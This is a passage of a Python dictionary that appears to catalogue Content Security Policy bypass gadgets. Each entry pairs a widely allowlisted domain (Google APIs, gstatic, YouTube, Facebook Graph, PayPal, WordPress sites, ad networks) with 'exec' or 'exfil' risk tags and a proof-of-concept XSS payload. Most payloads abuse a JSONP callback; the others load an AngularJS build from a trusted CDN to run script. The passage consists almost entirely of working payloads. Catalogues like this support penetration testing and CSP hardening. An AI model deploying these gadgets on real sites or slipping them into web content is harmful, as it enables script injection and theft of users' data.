    "go.dev": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://go.dev/blog/.json?jsonp=alert"></script>']},
    "go.snyk.io": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>'
        ],
    },
    "graph.facebook.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>'],
    },
    "graph.instagram.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://graph.instagram.com/logging_client_events?callback=alert></script>"],
    },
    "gravatar.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>'],
    },
    "gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>',
            "<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
        ],
    },
    "gum.criteo.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>'],
    },
    "hcaptcha.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>'],
    },
    "help.afterpay.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
        ],
    },
    "i.ytimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://i.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "iam.clients6.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://iam.clients6.google.com/v1/projects/gen-lang-client-1/serviceAccounts?callback=alert(1)"></script>'
        ],
    },
    "id.cxense.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://id.cxense.com/public/user/id?callback=alert></script>"],
    },
    "identitytoolkit.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://identitytoolkit.googleapis.com/v1/projects?callback=alert(1)"></script>'],
    },
    "improvedigital.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://improvedigital.com/wp-json?_jsonp=alert"></script>'],
    },
    "info.cloudflare.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>'
        ],
    },
    "info.elastic.co": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>'
        ],
    },
    "inno.blob.core.windows.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "investor.coinbase.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>'
        ],
    },
    "ipinfo.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>'],
    },
    "itunes.apple.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>'],
    },
    "jewelbetting.co": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://jewelbetting.co/wp-json?_jsonp=alert"></script>'],
    },
    "jquery.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://jquery.com/wp-json?_jsonp=alert"></script>'],
    },
    "js.hcaptcha.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>'],
    },
    "jsconfig.adsafeprotected.com": {
        "risks": ["exec"],
        "pocs": [
            "<script src=https://jsconfig.adsafeprotected.com/jsconfig/rjss/st/1/1/skeleton.js?cbName=x;var%20__IASScope;alert(1)></script>"
        ],
    },
    "kampyle.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://kampyle.com/wp-json?_jsonp=alert"></script>'],
    },
    "kbcprod.service-now.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "kendo.cdn.telerik.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://kendo.cdn.telerik.com/2015.2.805/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "lghnh-mkt-prod1.campaign.adobe.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>'
        ],
    },
    "libsyn.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://libsyn.com/wp-json?_jsonp=alert"></script>'],
    },
    "links.services.disqus.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>'
        ],
    },
    "locate.pricespider.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://locate.pricespider.com/?callback=alert(1)"></script>'],
    },
    "lptag.liveperson.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>'
        ],
    },
    "m.media-amazon.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "makroo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://makroo.com/wp-json?_jsonp=alert"></script>'],
    },
    "mango.buzzfeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>'
        ],
    },
    "maps-api-ssl.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>'],
    },
    "maps.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.de": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.de/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.lv": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.google.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>'],
    },
    "maps.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>',
            '<script src="https://maps.googleapis.com/maps/vt?pb=%211m4%211m3%211i10%212i724%213i439%211m4%211m3%211i10%212i720%213i440%211m4%211m3%211i10%212i720%213i441%211m4%211m3%211i10%212i721%213i440%211m4%211m3%211i10%212i721%213i441%211m4%211m3%211i10%212i722%213i440%211m4%211m3%211i10%212i722%213i441%211m4%211m3%211i10%212i723%213i440%211m4%211m3%211i10%212i723%213i441%211m4%211m3%211i10%212i724%213i440%211m4%211m3%211i10%212i724%213i441%212m3%211e0%212sm%213i773537128%213m13%212sen%213sIN%215e18%2112m5%211e68%212m2%211sset%212sRoadmap%214e2%2112m3%211e37%212m1%211ssmartmaps%214e3%2112m1%215b1%2123i46991212%2123i47054750&callback=alert(10)//&client=google-maps-pro&token=124706"></script>',
        ],
    },
    "mc.yandex.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>'],
    },
    "mouseflow.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://mouseflow.com/wp-json?_jsonp=alert"></script>'],
    },
    "nominatim.openstreetmap.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>'
        ],
    },
    "oamssoqae.ieee.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>'
        ],
    },
    "okaccedo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://okaccedo.com/wp-json?_jsonp=alert"></script>'],
    },
    "openexchangerates.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>'
        ],
    },
    "openx.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://openx.com/wp-json?_jsonp=alert"></script>'],
    },
    "page.gitlab.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>'
        ],
    },
    "pages.nist.gov": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "partner.googleadservices.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>'
        ],
    },
    "passport.baidu.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>'],
    },
    "polyfill-fastly.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>'],
    },
    "polyfill.alicdn.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>'],
    },
    "preply.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://preply.com/wp-json?_jsonp=alert"></script>'],
    },
    "pubads.g.doubleclick.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>'
        ],
    },
    "public-api.wordpress.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>'
        ],
    },
    "publish.twitter.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://publish.twitter.com/oembed?url=https://twitter.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "pubmatic.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://pubmatic.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "query.fqtag.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://query.fqtag.com/b?callback=alert(1)"></script>'],
    },
    "r.skimresources.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://r.skimresources.com/api/?callback=alert"></script>'],
    },
    "raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>'
        ],
    },
    "recaptcha.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>'],
    },
    "reklamstore.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://reklamstore.com/wp-json?_jsonp=alert"></script>'],
    },
    "rentokil-domains.firebaseio.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>'],
    },
    "resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "resultsmedia.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://resultsmedia.com/wp-json?_jsonp=alert"></script>'],
    },
    "ring.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>'],
    },
    "romania.amazon.com": {
        "risks": ["exec"],
        "pocs": [
            "<body ng-app ng-csp><script src=\"https://romania.amazon.com/app/vendor.min.js\"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>"
        ],
    },
    "rtb0.doubleverify.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>'],
    },
    "s.fqtag.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://s.fqtag.com/b?callback=alert(1)"></script>'],
    },
    "s.yimg.jp": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "s.ytimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "sanalofisonline.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sanalofisonline.com/wp-json?_jsonp=alert"></script>'],
    },
    "search.yahoo.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>'
        ],
    },
    "secure.gravatar.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>'
        ],
    },
    "securepubads.g.doubleclick.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>'
        ],
    },
    "server.ethicalads.io": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>'
        ],
    },
    "sharethis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sharethis.com/wp-json?_jsonp=alert"></script>'],
    },
    "shop.samsung.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>'],
    },
    "smaato.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://smaato.com/wp-json?_jsonp=alert"></script>'],
    },
    "smartcaptcha.yandexcloud.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>'],
    },
    "social.yandex.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>'],
    },
    "soundcloud.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>'
        ],
    },
    "srv.carbonads.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>'],
    },
    "ssl.gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "sso.bytedance.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>'],
    },
    "st3.zoom.us": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "static.parastorage.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "storemapper-herokuapp-com.global.ssl.fastly.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>'
        ],
    },
    "suggest.taobao.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://suggest.taobao.com/sug?callback=alert"></script>'],
    },
    "suggestqueries-clients6.youtube.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>'
        ],
    },
    "support.zendesk.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>'
        ],
    },
    "sync.im-apps.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>'
        ],
    },
    "tagmanager.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "tebilisim.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://tebilisim.com/wp-json?_jsonp=alert"></script>'],
    },
    "termly.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://termly.io/wp-json?_jsonp=alert"></script>'],
    },
    "thebrave.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://thebrave.io/wp-json?_jsonp=alert"></script>'],
    },
    "thiscanbeanything.zendesk.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
        ],
    },
    "tlx.3lift.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://tlx.3lift.com/header/auction?callback=alert(1)></script>"],
    },
    "tr.indeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>'],
    },
    "tr.snapchat.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://tr.snapchat.com/config/com/%27%29%3B%7Dcatch%28e%29%7B%7D%7D%3Balert%281%29%3B%21function%28%29%7Btry%7B%28%27.js"></script>'
        ],
    },
    "translate.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>'],
    },
    "translate.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>'
        ],
    },
    "translate.yandex.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>'],
    },
    "trustarc.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://trustarc.com/wp-json?_jsonp=alert"></script>'],
    },
    "typekit.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>'],
    },
    "udgnoz7mccyaowzp.public.blob.vercel-storage.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>'
        ],
    },
    "ug.alibaba.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>'],
    },
    "uk.indeed.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>'],
    },
    "ulogin.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>'],
    },
    "unpkg.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://unpkg.com/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
            '<script src="https://unpkg.com/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">',
            '<script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">',
        ],
    },
    "urs.pbs.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>'],
    },
    "usercentrics.eu": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://usercentrics.eu/wp-json?_jsonp=alert"></script>'],
    },
    "vidyome.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://vidyome.com/wp-json?_jsonp=alert"></script>'],
    },
    "vimeo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>'],
    },
    "visitor-service.tealiumiq.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>'
        ],
    },
    "visualwebsiteoptimizer.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "wb.amap.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://wb.amap.com/channel.php?callback=alert"></script>'],
    },
    "widget.usersnap.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>'
        ],
    },
    "widgets.pinterest.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>'
        ],
    },
    "wikipedia.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>'
        ],
    },
    "wordpress.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>'],
    },
    "wse.api.here.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>'
        ],
    },
    "www-api.ibm.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>'
        ],
    },
    "www.ancestrycdn.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "www.bing.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>'
        ],
    },
    "www.blogger.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>'
        ],
    },
    "www.google-analytics.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "www.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>',
            "<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
            "<script src='https://www.google.com/maps/vt?pb=%211m8%213m7%211m2%211u5376%212u3328%212m2%211u768%212u512%213i5%212m3%211e0%212sm%213i-1%213m3%212sen-IN%213sIN%215e1270%214e4%2111m2%211e2%212b1%2123i72259375%2123i72732929%2123i227337&callback=alert(10);//'></script>",
        ],
    },
    "www.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>',
            '<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>',
            '<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>',
        ],
    },
    "www.googletagmanager.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
        ],
    },
    "www.gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>',
            "<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
        ],
    },
    "www.meteoprog.ua": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>'
        ],
    },
    "www.microsoft.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>'],
    },
    "www.paypal.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>'],
    },
    "www.recaptcha.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>'],
    },
    "www.reddit.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>'],
    },
